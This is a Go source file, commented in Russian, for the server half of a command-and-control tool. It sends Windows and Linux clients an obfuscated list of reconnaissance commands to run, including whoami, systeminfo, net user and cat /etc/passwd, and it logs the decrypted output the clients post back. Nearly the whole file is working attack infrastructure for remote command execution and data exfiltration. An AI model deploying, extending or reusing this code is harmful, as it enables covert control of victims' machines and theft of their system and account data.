package main

import (
	"fmt"
	"io"
	"log"
	"net/http"
	"strings"
)

// КОНСТАНТЫ
const ServerAddress string = "192.168.0.126:9292"
const key string = "super key"

// Ошибка для лентяя
func ErrorLazy(err error) {
	if err != nil {
		log.Fatal(err)
	}
}

// Шифрование отправляемых клиенту данных
func EncryptMsg(msg string) (data []byte) {
	msgrune, keyrune := []rune(msg), []rune(key)
	msglen, keylen := len(msgrune), len(keyrune)

	crypt := make([]rune, msglen)

	for j := range msgrune {
		crypt[j] = msgrune[j] + keyrune[j%(keylen)]
	}

	data = []byte(string(crypt))

	return
}

// Расшифровка поступающих от клиента данных
func DecryptMsg(r *http.Request) (msg string) {
	data, err := io.ReadAll(r.Body)
	ErrorLazy(err)

	crypt, keyrune := []rune(string(data)), []rune(key)
	cryptlen, keylen := len(crypt), len(keyrune)

	decmsg := make([]rune, cryptlen)

	for j := range crypt {
		decmsg[j] = crypt[j] - keyrune[j%(keylen)]
	}

	msg = string(decmsg)

	return
}

//Функция подбора команд под ОС
func ChooseCmd(os string) (cmds []string) {
	// Здесь находится список (массив) команд, которые нееобходимо выполнить клиенту
	//
	// Значения для exec.Command передаются в первых двух значениях массива для большей "управляемости" клинета
	//
	// Команды chcp 65001 и chcp 866 нужны, чтобы сметить кодировку консоли с UTF-16 (вроде) на UTF-8 и обратно (на всякий случай)
	// Иначе ответ от клиента будет приходить в плохочитаемом виде.
	// К сожалению не нашел способ, как заставить exec.Command воспринимать русский текст из консоли

	switch os {
	case "windows":
		cmds = []string{"cmd",
			"/C",
			"chcp 65001",
			"user info",
			"whoami",
			"systeminfo",
			"net user",
			"ipconfig",
			"chcp 866"}
	case "linux":
		cmds = []string{"sh",
			"-c",
			"user info",
			"whoami",
			"cat /etc/passwd",
			"uname -a",
			"lsb_release -a",
			"hostnamectl"}
	default:
		cmds = []string{"NOTMYCASE"}
	}

	return
}

// СОбработчик запросов
type Handler struct{}

func (x Handler) ServeHTTP(w http.ResponseWriter, r *http.Request) {

	if r.Method == "GET" {
		fmt.Printf("\n!!!---%s connected---!!!\n\n", r.FormValue("os"))

		// Массив команд преобразуется в строку и отправляется клиенту
		cmds := strings.Join(ChooseCmd(r.FormValue("os")), ";")
		_, err := w.Write(EncryptMsg(cmds))
		ErrorLazy(err)

	} else if r.Method == "POST" {
		// Вывод в лог данных, присылаемых клиентом
		fmt.Print(DecryptMsg(r))

	} else {
		// Если произошло что-то непонятное
		_, err := w.Write(EncryptMsg("NOTMYCASE"))
		ErrorLazy(err)
		fmt.Print("Unforeseen http method!\n")
	}

}

func main() {
	var h Handler

	server := http.Server{
		Addr:    ServerAddress,
		Handler: h,
	}

	fmt.Print("Server online\n")

	err := server.ListenAndServe()
	ErrorLazy(err)

}
